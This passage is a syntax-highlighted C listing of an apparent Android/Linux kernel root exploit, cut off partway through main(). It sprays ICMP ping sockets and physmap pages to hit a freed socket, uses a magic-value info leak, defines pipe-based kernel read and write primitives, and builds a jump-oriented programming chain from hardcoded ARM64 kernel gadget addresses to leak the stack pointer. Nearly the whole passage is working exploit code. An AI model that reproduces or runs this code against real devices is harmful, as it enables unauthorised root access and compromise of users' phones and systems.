class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sysinfo.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sockios.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MMAP_BEGIN                0x200000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE              4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIOCGSTAMPNS               0x8907</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAGIC_VALUE               0x4B5F5F4B</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OOM_DISABLE                       (-100)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NSEC_PER_SEC                      1000000000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STATUS_SUCCESS                    0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STATUS_FAILURE                    -1  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_PHYSMAP_SIZE                  128*1024*1024</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_PATH                          0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_PHYSMAP_SPRAY_PROCESS         6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_VULTRIG_SOCKS_COUNT           4000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_NULLMAP_SIZE                  (PAGE_SIZE * 4)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span>   vultrig_socks[MAX_VULTRIG_SOCKS_COUNT];</span><br><span class="line"><span class="keyword">void</span>* physmap_spray_pages[(MAX_PHYSMAP_SIZE / PAGE_SIZE) * MAX_PHYSMAP_SPRAY_PROCESS];</span><br><span class="line"><span class="keyword">int</span>   physmap_spray_pages_count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">maximize_fd_limit(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim</span>;</span></span><br><span class="line">  <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">  ret = getrlimit(RLIMIT_NOFILE, &amp;rlim);</span><br><span class="line">  <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  rlim.rlim_cur = rlim.rlim_max;</span><br><span class="line">  setrlimit(RLIMIT_NOFILE, &amp;rlim);</span><br><span class="line"></span><br><span class="line">  ret = getrlimit(RLIMIT_NOFILE, &amp;rlim);</span><br><span class="line">  <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> rlim.rlim_cur;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spray_nofork</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span>*       mapped;</span><br><span class="line">  <span class="keyword">void</span>*       mapped_page;</span><br><span class="line">  <span class="keyword">int</span>         ret, i;</span><br><span class="line"></span><br><span class="line">  mapped = mmap(<span class="literal">NULL</span>, size , PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span>(MAP_FAILED == mapped)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] mmap fail.\\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;size/PAGE_SIZE; i++)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="built_in">memset</span>((<span class="keyword">void</span> *)((<span class="keyword">char</span> *)mapped + PAGE_SIZE * i), <span class="number">0x41</span>, PAGE_SIZE);  </span><br><span class="line">      mapped_page = (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)mapped + PAGE_SIZE * i);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">        info leak trick mentioned in Xu Wen&#x27;s paper, a magic value will be read in sock_get_timestampns</span></span><br><span class="line"><span class="comment">        ROM:FFFFFFC00038722C                 LDR             X0, [X19,#0x1E0]</span></span><br><span class="line"><span class="comment">        ROM:FFFFFFC000387230                 BL              ns_to_timespec</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)mapped_page + <span class="number">0x1E0</span>)  = MAGIC_VALUE + physmap_spray_pages_count;</span><br><span class="line">      <span class="comment">/*ret = mlock(mapped_page, PAGE_SIZE);</span></span><br><span class="line"><span class="comment">      if(-1 == ret)</span></span><br><span class="line"><span class="comment">      &#123;</span></span><br><span class="line"><span class="comment">          perror(&quot;[*] lock the mapped page fail&quot;);</span></span><br><span class="line"><span class="comment">          return -1;</span></span><br><span class="line"><span class="comment">      &#125;*/</span></span><br><span class="line"></span><br><span class="line">      physmap_spray_pages[physmap_spray_pages_count]  =  mapped_page;</span><br><span class="line">      physmap_spray_pages_count++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kernel_read8</span><span class="params">(<span class="keyword">void</span>* kernel_addr,  <span class="keyword">unsigned</span> <span class="keyword">long</span>* value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pipefd[<span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == pipe(pipefd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] create dual pipe fail.\\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == write(pipefd[<span class="number">1</span>], kernel_addr, <span class="number">8</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;[*] write pipe fail.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span> == read(pipefd[<span class="number">0</span>], value, <span class="number">8</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;[*] read piple fail.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kernel_read4</span><span class="params">(<span class="keyword">void</span>* kernel_addr,  <span class="keyword">unsigned</span> <span class="keyword">int</span>* value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pipefd[<span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == pipe(pipefd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] create dual pipe fail.\\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == write(pipefd[<span class="number">1</span>], kernel_addr, <span class="number">4</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;[*] write pipe fail.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span> == read(pipefd[<span class="number">0</span>], value, <span class="number">4</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;[*] read piple fail.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kernel_write8</span><span class="params">(<span class="keyword">void</span>* kernel_addr, <span class="keyword">unsigned</span> <span class="keyword">long</span>* value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span> pipefd[<span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == pipe(pipefd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] create dual pipe fail.\\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == write(pipefd[<span class="number">1</span>], value, <span class="number">8</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;[*] write pipe fail.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span> == read(pipefd[<span class="number">0</span>], kernel_addr, <span class="number">8</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;[*] read piple fail.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kernel_write4</span><span class="params">(<span class="keyword">void</span>* kernel_addr, <span class="keyword">unsigned</span> <span class="keyword">int</span>* value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span> pipefd[<span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == pipe(pipefd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] create dual pipe fail.\\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == write(pipefd[<span class="number">1</span>], value, <span class="number">4</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;[*] write pipe fail.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span> == read(pipefd[<span class="number">0</span>], kernel_addr, <span class="number">4</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;[*] read piple fail.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">search_exploitable_socket</span><span class="params">(<span class="keyword">int</span>* index, <span class="keyword">void</span>** payload)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span>    <span class="title">timespec</span> <span class="title">time</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>  value;</span><br><span class="line">    <span class="keyword">void</span>*     page     =  <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span>       j        =  <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>       exp_sock = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span>       got      =  <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Searching exploitable socket&quot;</span>);</span><br><span class="line">    *payload  = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        exp_sock = vultrig_socks[*index];</span><br><span class="line">        <span class="built_in">memset</span>(&amp;time, <span class="number">0</span>, <span class="keyword">sizeof</span>(time));</span><br><span class="line">        ioctl(exp_sock, SIOCGSTAMPNS, &amp;time);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            ts.tv_sec = div_s64_rem(nsec, NSEC_PER_SEC, &amp;rem);</span></span><br><span class="line"><span class="comment">            if (unlikely(rem &lt; 0)) &#123;</span></span><br><span class="line"><span class="comment">             ts.tv_sec--;</span></span><br><span class="line"><span class="comment">              rem += NSEC_PER_SEC;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            ts.tv_nsec = rem;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        value = ((<span class="keyword">uint64_t</span>)time.tv_sec * NSEC_PER_SEC) + time.tv_nsec;</span><br><span class="line">        <span class="comment">// printf(&quot;search_exploitable_socket: %d, %llx\\n&quot;, *index, value);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;  j&lt;physmap_spray_pages_count; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            page = physmap_spray_pages[j];</span><br><span class="line">            <span class="keyword">if</span>(value == *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)page + <span class="number">0x1E0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[*] magic:%p\\n&quot;</span>, value);</span><br><span class="line">                got      = <span class="number">1</span>;</span><br><span class="line">                *payload = page;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        *index = *index + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!got &amp;&amp; *index &lt; MAX_VULTRIG_SOCKS_COUNT);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(got == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> exp_sock;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">jop</span><span class="params">(<span class="keyword">int</span> exp_sock, <span class="keyword">void</span> *payload)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] JOP leaking sp\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> *mmap_addrs[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span> ; i++) &#123;</span><br><span class="line">      mmap_addrs[i] = mmap(<span class="literal">NULL</span>, PAGE_SIZE * <span class="number">4</span>,</span><br><span class="line">                        PROT_READ | PROT_WRITE,</span><br><span class="line">                        MAP_SHARED | MAP_ANONYMOUS,</span><br><span class="line">                        <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//   printf(&quot;mmap_addrs[%d]: %p\\n&quot;, i, mmap_addrs[i]);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> ADDR_ADD(p,n)           ((void *)((char *)(p) + (n)))</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    0xffffffc0000e6158: ldr x1, [x19, #0x10]; ldr x0, [x19, #0x18]; blr x1;</span></span><br><span class="line"><span class="comment">    0xffffffc0004c708c: ldr x2, [x0, #0x58]; ldr x1, [x0, #0x60]; ldr x2, [x2]; blr x2;</span></span><br><span class="line"><span class="comment">    0xffffffc0000ea5c0: ldr x3, [x1, #0x80]; ldr x0, [x0, #8]; blr x3;</span></span><br><span class="line"><span class="comment">    0xFFFFFFC0002FD50C: ldr x2, [x0,#0x90]; cbz x2, #0x27d530; ldr x3, [x2, #0x68]; cbz x3, #0x27d53c; ldr x1, [x3, #0x18]; cbz x1, #0x27d530; blr x1;</span></span><br><span class="line"><span class="comment">    0xffffffc0004c708c: ldr x2, [x0, #0x58]; ldr x1, [x0, #0x60]; ldr x2, [x2]; blr x2;</span></span><br><span class="line"><span class="comment">    0xffffffc000083db8: mov x0, sp; blr x1;</span></span><br><span class="line"><span class="comment">    0xffffffc0000eb704: mov x1, x3; ldr x3, [x3, #0xc0]; blr x3;</span></span><br><span class="line"><span class="comment">    0xffffffc0004cdd74: str x0, [x1, #8]; mov x0, x19; ldr x1, [x19, #0x20]; ldr x1, [x1, #0x28]; blr x1;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    // return to inet_release 0xFFFFFFC00042E3A4</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p=payload;</span><br><span class="line">    <span class="keyword">void</span> *x19 = payload;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0xffffffc0000e6158: ldr x1, [x19, #0x10]; ldr x0, [x19, #0x18]; blr x1;</span></span><br><span class="line">    p = ADDR_ADD(x19, <span class="number">0x10</span>);</span><br><span class="line">    *p = <span class="number">0xffffffc0004c708c</span>;</span><br><span class="line">    p = ADDR_ADD(x19, <span class="number">0x18</span>);</span><br><span class="line">    *p = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)mmap_addrs[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// 0xffffffc0004c708c: ldr x2, [x0, #0x58]; ldr x1, [x0, #0x60]; ldr x2, [x2]; blr x2;</span></span><br><span class="line">    p = ADDR_ADD(mmap_addrs[<span class="number">0</span>], <span class="number">0x58</span>);</span><br><span class="line">    *p = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)mmap_addrs[<span class="number">1</span>];</span><br><span class="line">    p = ADDR_ADD(mmap_addrs[<span class="number">1</span>], <span class="number">0x0</span>);</span><br><span class="line">    *p = <span class="number">0xffffffc0000ea5c0</span>;</span><br><span class="line">    p = ADDR_ADD(mmap_addrs[<span class="number">0</span>], <span class="number">0x60</span>);</span><br><span class="line">    *p = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)mmap_addrs[<span class="number">2</span>];</span><br><span class="line">    <span class="comment">// 0xffffffc0000ea5c0: ldr x3, [x1, #0x80]; ldr x0, [x0, #8]; blr x3;</span></span><br><span class="line">    p = ADDR_ADD(mmap_addrs[<span class="number">2</span>], <span class="number">0x80</span>);</span><br><span class="line">    *p = <span class="number">0xFFFFFFC0002FD50C</span>;</span><br><span class="line">    p = ADDR_ADD(mmap_addrs[<span class="number">0</span>], <span class="number">0x8</span>);</span><br><span class="line">    *p = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)mmap_addrs[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0xFFFFFFC0002FD50C: ldr x2, [x0,#0x90]; cbz x2, #0x27d530; ldr x3, [x2, #0x68]; cbz x3, #0x27d53c; ldr x1, [x3, #0x18]; cbz x1, #0x27d530; blr x1;</span></span><br><span class="line">    p = ADDR_ADD(mmap_addrs[<span class="number">3</span>], <span class="number">0x90</span>);</span><br><span class="line">    *p = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)mmap_addrs[<span class="number">2</span>];</span><br><span class="line">    p = ADDR_ADD(mmap_addrs[<span class="number">2</span>], <span class="number">0x68</span>);</span><br><span class="line">    *p = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)mmap_addrs[<span class="number">4</span>];</span><br><span class="line">    p = ADDR_ADD(mmap_addrs[<span class="number">4</span>], <span class="number">0x18</span>);</span><br><span class="line">    *p = <span class="number">0xffffffc0004c708c</span>;</span><br><span class="line">    <span class="comment">// 0xffffffc0004c708c: ldr x2, [x0, #0x58]; ldr x1, [x0, #0x60]; ldr x2, [x2]; blr x2;</span></span><br><span class="line">    p = ADDR_ADD(mmap_addrs[<span class="number">3</span>], <span class="number">0x58</span>);</span><br><span class="line">    *p = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)mmap_addrs[<span class="number">5</span>];</span><br><span class="line">    p = ADDR_ADD(mmap_addrs[<span class="number">5</span>], <span class="number">0x0</span>);</span><br><span class="line">    *p = <span class="number">0xffffffc000083db8</span>;</span><br><span class="line">    p = ADDR_ADD(mmap_addrs[<span class="number">3</span>], <span class="number">0x60</span>);</span><br><span class="line">    *p = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0xffffffc0000eb704</span>;</span><br><span class="line">    <span class="comment">// 0xffffffc000083db8: mov x0, sp ; blr x1</span></span><br><span class="line">    <span class="comment">// 0xffffffc0000eb704: mov x1, x3; ldr x3, [x3, #0xc0]; blr x3;</span></span><br><span class="line">    p = ADDR_ADD(mmap_addrs[<span class="number">4</span>], <span class="number">0xc0</span>);</span><br><span class="line">    *p = <span class="number">0xffffffc0004cdd74</span>;</span><br><span class="line">    <span class="comment">// 0xffffffc0004cdd74: str x0, [x1, #8]; mov x0, x19; ldr x1, [x19, #0x20]; ldr x1, [x1, #0x28]; blr x1;</span></span><br><span class="line">    <span class="comment">// write sp into ADDR_ADD(mmap_addrs[4], 0x8);</span></span><br><span class="line">    p = ADDR_ADD(x19, <span class="number">0x20</span>);</span><br><span class="line">    *p = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)mmap_addrs[<span class="number">6</span>];</span><br><span class="line">    p = ADDR_ADD(mmap_addrs[<span class="number">6</span>], <span class="number">0x28</span>);</span><br><span class="line">    *p = <span class="number">0xFFFFFFC00042E3A4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do JOP</span></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)payload + <span class="number">0x2a0</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)payload + <span class="number">0x28</span>)  = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)payload;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)payload)         = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0xffffffc0000e6158</span>;</span><br><span class="line">    close(exp_sock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *sp = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(ADDR_ADD(mmap_addrs[<span class="number">4</span>], <span class="number">0x8</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] sp: %p\\n&quot;</span>, sp); </span><br><span class="line">    <span class="keyword">return</span> sp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span>      physmap_spray_children[MAX_PHYSMAP_SPRAY_PROCESS];</span><br><span class="line">    <span class="keyword">int</span>       i, ret, j, exp_sock, exp_sock_index;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  data8;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>   data4;</span><br><span class="line">    <span class="keyword">void</span>*     payload;</span><br><span class="line">    <span class="keyword">void</span>*     cred;</span><br><span class="line">    <span class="keyword">void</span>*     page;</span><br><span class="line">    <span class="keyword">void</span>*     task;</span><br><span class="line">    <span class="keyword">void</span>*     files;</span><br><span class="line">    <span class="keyword">void</span>*     fdt;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr1</span> =</span> &#123; .sa_family = AF_INET      &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr2</span> =</span> &#123; .sa_family = AF_UNSPEC &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == maximize_fd_limit())</span><br><span class="line">      &#123;</span><br><span class="line">              perror(<span class="string">&quot;[*] maximize socket limit fail&quot;</span>);</span><br><span class="line">              <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;MAX_VULTRIG_SOCKS_COUNT; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        vultrig_socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">-1</span> == vultrig_socks[i])</span><br><span class="line">        &#123;</span><br><span class="line">            perror(<span class="string">&quot;[-] create vultrig socket fail.\\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ret = connect(vultrig_socks[i], &amp;addr1, <span class="keyword">sizeof</span>(addr1));</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">-1</span> == ret)</span><br><span class="line">        &#123;</span><br><span class="line">            perror(<span class="string">&quot;[-] create vultrig socket fail.\\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span>* user_mm = mmap(MMAP_BEGIN, MAX_NULLMAP_SIZE, 